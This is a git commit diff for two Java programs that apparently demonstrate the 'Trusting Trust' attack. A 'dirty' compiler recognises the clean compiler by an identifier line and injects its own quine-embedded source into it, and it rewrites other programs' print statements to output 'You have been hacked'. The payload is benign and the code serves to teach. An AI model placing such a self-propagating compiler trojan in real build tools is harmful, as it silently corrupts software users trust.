8740e49b63adeaf17f292eb7d9c5860ca9b98dd7
Nadav <rosenbergnadav@gmail.com>
2021-07-20 20:34:53 +0300

    quine

--- src/src/CleanCompiler.java
+++ src/src/CleanCompiler.java
@@ -1,33 +1,90 @@
 // 2jndaw9fiasndjf393u48fun24rj84jfu4h9
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileWriter;
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.NoSuchElementException;
 
 public class CleanCompiler {
     public static final String ANSI_RED = "\u001B[31m";
     public static final String ANSI_GREEN = "\u001B[32m";
+    private static final String CLEAN_COMPILER_IDENTIFIER = "// 2jndaw9fiasndjf393u48fun24rj84jfu4h9";
+    private static final String SYSTEM_OUT_IDENTIFIER = "System.out.println([\"|\\w|\\W]+);";
 
     public static void main(String[] args) {
         if (args.length < 1) {
-            System.out.println(ANSI_RED + "File wasn't provided for compilation" + ANSI_RED);
+            System.out.println(ANSI_RED + "File wasn't provided for compilation." + ANSI_RED);
             return;
         }
 
+        String filePath = args[0];
         try {
-            String filePath = args[0];
-            if (runOriginalCompiler(filePath) == 0) {
-                System.out.println(ANSI_GREEN + "The compilation ended successfully" + ANSI_GREEN);
-            } else {
-                System.out.println(ANSI_RED + "Something Went Wrong. Please make check that the file" + "" +
-                        " path you have entered is a full path, for ex. C:\\Users\\HelloWorld.java" + ANSI_RED);
-            }
+            StringBuilder builder = new StringBuilder();
+
+            // Loading the source file
+            File program = new File(filePath);
+
+            builder.append(Files.readString(Path.of(program.getPath())));
+
+            generateClassFile(program, builder);
+            System.out.println(ANSI_GREEN + "The compilation ended successfully." + ANSI_GREEN);
+            System.out.println(ANSI_GREEN + getInstruction(program) + ANSI_GREEN);
+
+        } catch (FileNotFoundException ex) {
+            System.out.println(ANSI_RED + "File '" + filePath + "' not found." + ANSI_RED);
+            System.out.println(ANSI_RED + "Please make sure that the file path you have entered is a full path, " +
+                    "for ex. C:\\Users\\HelloWorld.java." + ANSI_RED);
+        } catch (NoSuchElementException ex) {
+            System.out.println(ANSI_RED + "File '" + filePath + "' is empty" + ANSI_RED);
         } catch (Exception ex) {
             System.out.println(ANSI_RED + "Something Went Wrong. Error: " + ex + ANSI_RED);
         }
     }
 
-    private static int runOriginalCompiler(String filePath) throws InterruptedException, IOException {
+    private static void generateClassFile(File program, StringBuilder builder) throws Exception {
+        Path tempDirectory = Files.createTempDirectory(null);
+        String tempFileName = String.format("%s\\%s", tempDirectory, program.getName());
+
+        saveToTemp(builder, tempFileName);
+        runOriginalCompiler(tempFileName);
+
+        File tempClassFile = new File(replaceLast(tempFileName, "java", "class"));
+        File ClassFile = new File(replaceLast(program.getPath(), "java", "class"));
+        tempClassFile.renameTo(ClassFile);
+    }
+
+    private static void saveToTemp(StringBuilder builder, String tempFileName) throws IOException {
+        FileWriter tempFileWriter = new FileWriter(tempFileName);
+        tempFileWriter.write(builder.toString());
+        tempFileWriter.close();
+    }
+
+    private static void runOriginalCompiler(String filePath) throws Exception {
         Runtime rt = Runtime.getRuntime();
         Process pr = rt.exec(String.format("javac %s", filePath));
         pr.waitFor();
-        return pr.exitValue();
+
+        if (pr.exitValue() != 0) {
+            throw new Exception();
+        }
+    }
+
+    private static String replaceLast(String text, String target, String replacement) {
+        int pos = text.lastIndexOf(target);
+        if (pos > -1) {
+            return text.substring(0, pos)
+                    + replacement
+                    + text.substring(pos + target.length());
+        } else {
+            return text;
+        }
+    }
+
+    private static String getInstruction(File program) {
+        String ClassFile = replaceLast(program.getName(), "java", "");
+        String ClassPath = program.getPath().substring(0, program.getPath().lastIndexOf("\\"));
+        return String.format("Run this to see results: java -cp %s %s", ClassPath, ClassFile);
     }
 }
--- src/src/DirtyCompiler.java
+++ src/src/DirtyCompiler.java
@@ -60,14 +60,10 @@ public class DirtyCompiler {
     }
 
     private static void getDirtyCompiler(File program, StringBuilder builder) {
-        //fileToCompile = new File("./TheCompiler.java");
-        //Copy the content of this compiler into the clean one.
-        //fileToCompileScanner.close();
-        //fileToCompileScanner = new Scanner(fileToCompile);
-        //builder.append(data);
-        //builder.builderappend("\n");
-
-        //fileContent = fileContent.replaceFirst("public class TheCompiler", "public class " + fileName);
+        String dirtyCompilerContentRaw = getDirtyCompilerSourceCode();
+        String dirtyCompilerContentRawAsComment = dirtyCompilerContentRaw.replace("\\", "\\\\");
+        String dirtyCompilerContent = replaceLast(dirtyCompilerContentRaw, "// insert the source code again", "return \"\"\"\n" + dirtyCompilerContentRawAsComment + "\"\"\";");
+        builder.append(dirtyCompilerContent);
     }
 
     private static void getDirtyProgram(File program, StringBuilder builder) throws FileNotFoundException {
@@ -111,18 +107,165 @@ public class DirtyCompiler {
         pr.waitFor();
 
         if (pr.exitValue() != 0) {
-            throw new Exception();
+            throw new Exception(pr.toString());
         }
     }
 
-    private static String replaceLast(String text, String regex, String replacement) {
-        return text.replaceFirst("(?s)(.*)" + regex, "$1" + replacement);
+    private static String replaceLast(String text, String target, String replacement) {
+        int pos = text.lastIndexOf(target);
+        if (pos > -1) {
+            return text.substring(0, pos)
+                    + replacement
+                    + text.substring(pos + target.length());
+        } else {
+            return text;
+        }
     }
 
     private static String getInstruction(File program) {
         String ClassFile = replaceLast(program.getName(), "java", "");
         String ClassPath = program.getPath().substring(0, program.getPath().lastIndexOf("\\"));
         return String.format("Run this to see results: java -cp %s %s", ClassPath, ClassFile);
+    }
+
+    private static String getDirtyCompilerSourceCode() {
+        return """
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.NoSuchElementException;
+import java.util.Scanner;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+public class DirtyCompiler {
+    public static final String ANSI_RED = "\\u001B[31m";
+    public static final String ANSI_GREEN = "\\u001B[32m";
+    private static final String CLEAN_COMPILER_IDENTIFIER = "// 2jndaw9fiasndjf393u48fun24rj84jfu4h9";
+    private static final String SYSTEM_OUT_IDENTIFIER = "System.out.println([\\"|\\\\w|\\\\W]+);";
+
+    public static void main(String[] args) {
+        if (args.length < 1) {
+            System.out.println(ANSI_RED + "File wasn't provided for compilation." + ANSI_RED);
+            return;
+        }
+
+        String filePath = args[0];
+        try {
+            StringBuilder builder = new StringBuilder();
+
+            // Loading the source file
+            File program = new File(filePath);
+
+            if (isCleanCompiler(program)) {
+                getDirtyCompiler(program, builder);
+            } else {
+                getDirtyProgram(program, builder);
+            }
+
+            generateClassFile(program, builder);
+            System.out.println(ANSI_GREEN + "The compilation ended successfully." + ANSI_GREEN);
+            System.out.println(ANSI_GREEN + getInstruction(program) + ANSI_GREEN);
+
+        } catch (FileNotFoundException ex) {
+            System.out.println(ANSI_RED + "File '" + filePath + "' not found." + ANSI_RED);
+            System.out.println(ANSI_RED + "Please make sure that the file path you have entered is a full path, " +
+                    "for ex. C:\\\\Users\\\\HelloWorld.java." + ANSI_RED);
+        } catch (NoSuchElementException ex) {
+            System.out.println(ANSI_RED + "File '" + filePath + "' is empty" + ANSI_RED);
+        } catch (Exception ex) {
+            System.out.println(ANSI_RED + "Something Went Wrong. Error: " + ex + ANSI_RED);
+        }
+    }
+
+    private static boolean isCleanCompiler(File program) throws FileNotFoundException {
+        Pattern shebangPattern = Pattern.compile(CLEAN_COMPILER_IDENTIFIER);
+
+        Scanner programScanner = new Scanner(program);
+        String firstLine = new Scanner(program).nextLine();
+        programScanner.close();
+
+        return shebangPattern.matcher(firstLine).matches();
+    }
+
+    private static void getDirtyCompiler(File program, StringBuilder builder) {
+        String dirtyCompilerContentRaw = getDirtyCompilerSourceCode();
+        String dirtyCompilerContentRawAsComment = dirtyCompilerContentRaw.replace("\\\\", "\\\\\\\\");
+        String dirtyCompilerContent = replaceLast(dirtyCompilerContentRaw, "// insert the source code again", "return \\"\\"\\"\\n" + dirtyCompilerContentRawAsComment + "\\"\\"\\";");
+        builder.append(dirtyCompilerContent);
+    }
+
+    private static void getDirtyProgram(File program, StringBuilder builder) throws FileNotFoundException {
+        Pattern systemOutPattern = Pattern.compile(SYSTEM_OUT_IDENTIFIER);
+
+        Scanner programScanner = new Scanner(program);
+        while (programScanner.hasNextLine()) {
+            String line = programScanner.nextLine();
+            Matcher printLineMatcher = systemOutPattern.matcher(line.trim()); // we should check for substring
+            if (printLineMatcher.matches()) {
+                builder.append("System.out.println(\\"You have been hacked\\");\\n");
+            } else {
+                builder.append(line);
+                builder.append("\\n");
+            }
+        }
+        programScanner.close();
+    }
+
+    private static void generateClassFile(File program, StringBuilder builder) throws Exception {
+        Path tempDirectory = Files.createTempDirectory(null);
+        String tempFileName = String.format("%s\\\\%s", tempDirectory, program.getName());
+
+        saveToTemp(builder, tempFileName);
+        runOriginalCompiler(tempFileName);
+
+        File tempClassFile = new File(replaceLast(tempFileName, "java", "class"));
+        File ClassFile = new File(replaceLast(program.getPath(), "java", "class"));
+        tempClassFile.renameTo(ClassFile);
+    }
+
+    private static void saveToTemp(StringBuilder builder, String tempFileName) throws IOException {
+        FileWriter tempFileWriter = new FileWriter(tempFileName);
+        tempFileWriter.write(builder.toString());
+        tempFileWriter.close();
+    }
+
+    private static void runOriginalCompiler(String filePath) throws Exception {
+        Runtime rt = Runtime.getRuntime();
+        Process pr = rt.exec(String.format("javac %s", filePath));
+        pr.waitFor();
+
+        if (pr.exitValue() != 0) {
+            throw new Exception();
+        }
+    }
+
+    private static String replaceLast(String text, String target, String replacement) {
+        int pos = text.lastIndexOf(target);
+        if (pos > -1) {
+            return text.substring(0, pos)
+                    + replacement
+                    + text.substring(pos + target.length());
+        } else {
+            return text;
+        }
+    }
+
+    private static String getInstruction(File program) {
+        String ClassFile = replaceLast(program.getName(), "java", "");
+        String ClassPath = program.getPath().substring(0, program.getPath().lastIndexOf("\\\\"));
+        return String.format("Run this to see results: java -cp %s %s", ClassPath, ClassFile);
+    }
+
+    private static String getDirtyCompilerSourceCode() {
+        // insert the source code again
+    }
+}
+// nonce
+""";
     }
 }
 // nonce
